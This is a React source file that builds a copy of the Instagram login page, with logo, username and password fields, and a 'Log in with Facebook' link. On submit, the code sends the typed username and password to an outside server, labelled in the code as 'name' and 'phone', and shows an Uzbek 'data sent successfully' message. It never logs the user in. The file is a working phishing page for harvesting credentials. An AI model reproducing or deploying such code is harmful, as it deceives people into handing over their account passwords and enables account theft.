import { useState } from "react";
import "./App.scss"
import { IoLogoFacebook } from "react-icons/io";
import Logo from "./assets/logo.png"


function App() {
    const [name, setName] = useState("");
    const [phone, setPhone] = useState("");
    const [success, setSuccess] = useState("");

    const sendData = async (e) => {
        e.preventDefault();

        const response = await fetch("https://instagram-clone-for-phone-first.onrender.com/api/test", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                name,
                phone,
            }),
        });

        const data = await response.json();

        // alert(data.message);

        setSuccess(" Ma'lumot muvaffaqiyatli yuborildi!")
        setName("");
        setPhone("");
    };

    return (
        <div className="container">
            <div className="Logo">
                <img src={Logo} alt="" />
            </div>

            <form onSubmit={sendData} className="form">


                <div className="inptdiv">
                    <input
                        type="text"
                        placeholder="Phone number, email or username"
                        value={name}
                        onChange={(e) => setName(e.target.value)}
                        className="input1"
                    />


                    <input
                        type="text"
                        placeholder="Password"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="input2"
                    />
                </div>
                {/* 
                <br />
                <br /> */}

                <div className="frgtp">
                    <p>Forgot password?</p>
                </div>

                <button type="submit" className="submit">
                    Log in
                </button>

                <div className="or">
                    <hr />
                    <p>OR</p>
                    <hr />
                </div>

                <div className="wthfacebook">
                    <p><IoLogoFacebook className="fbicon" /> Log in with Facebook</p>
                </div>
            </form>

            <div className="bottom">
                <p>Don't have account? <a href="">Sign up</a></p>
            </div>
        </div>
    );
}

export default App;